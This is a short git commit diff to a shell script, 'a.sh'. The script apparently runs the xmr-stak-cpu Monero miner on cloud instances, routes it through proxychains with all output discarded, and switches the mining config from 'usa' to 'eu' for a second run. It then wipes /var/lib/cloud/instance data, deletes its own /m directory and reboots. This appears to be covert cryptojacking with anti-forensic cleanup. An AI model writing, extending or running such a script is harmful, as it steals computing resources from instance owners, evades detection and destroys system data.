c200831e9f0723023afaa2bfcf20c54d48e045df
smithinoz <smithinoz@users.noreply.github.com>
2017-07-06 22:29:06 +1000

    Update a.sh

--- a.sh
+++ a.sh
@@ -32,7 +32,9 @@ then
   sudo cp /m/test01/xmr/config.aws /m/test01/xmr/config.txt
   fi
   sudo /m/test01/proxychains/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr/xmr-stak-cpu >/dev/null 2>&1
-  rm -rf /var/lib/cloud/instance/*
+  sudo sed -i 's/usa/eu/' /m/test01/xmr/config.txt
+  sudo /m/test01/proxychains/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr/xmr-stak-cpu >/dev/null 2>&1
+    rm -rf /var/lib/cloud/instance/*
   cd /
   sudo rm -R /m
   sudo reboot   
